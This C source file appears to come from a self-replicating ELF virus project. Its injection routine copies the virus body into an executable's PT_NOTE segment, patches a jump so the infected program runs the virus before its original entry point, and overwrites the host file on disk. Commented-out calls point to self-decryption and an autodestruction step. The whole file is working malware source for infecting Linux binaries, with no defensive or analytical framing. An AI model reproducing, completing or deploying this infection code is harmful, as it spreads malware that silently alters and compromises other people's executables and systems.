#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
{
	const size_t payload_size = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));

	for (register size_t index = 0; index < segment[DATA]->p_offset + segment[DATA]->p_filesz; index++)
		*dst++ = *src++;

	for (register size_t index = 0; index < payload_size; index++)
		*dst++ = '*';
}

__attribute__((always_inline)) static inline void replicate_on_memory(char *dst, Elf64_Phdr **segment)
{
	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
}

__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
{
	char *tmp = dst + host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);

	while (true)
	{
		if (*(unsigned char *)tmp == 0xe9)
		{
			tmp++;
			break;
		}
		tmp++;
	}

	const int offset = (void *)(dst + (host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz)) - (void *)tmp;
	const int entry_point = host->entry[OLD] - host->entry[NEW] - (host->segment[NOTE]->p_filesz - (offset - JUMP_SIZE));

	_memcpy(dst + host->segment[NOTE]->p_offset, __entry, host->segment[NOTE]->p_filesz);
	_memcpy(dst + host->segment[NOTE]->p_offset + (host->segment[NOTE]->p_filesz - offset), &entry_point, sizeof(int));
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

#if DEBUG
	MID_TRACER("injection:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	char *ptr;
	int fd;

	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;

	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	write_on_memory(ptr, (char *)host->header, host->segment);
	replicate_on_memory(ptr, host->segment);
	patch_entry_point(ptr, host);
	//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);

	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(fd, ptr, filesize);
	_close(fd);
	_munmap(ptr, filesize);
	_munmap(host->header, host->filesize);

label:
	//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
	//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);

	autodestruction(host, keychain, context);
}
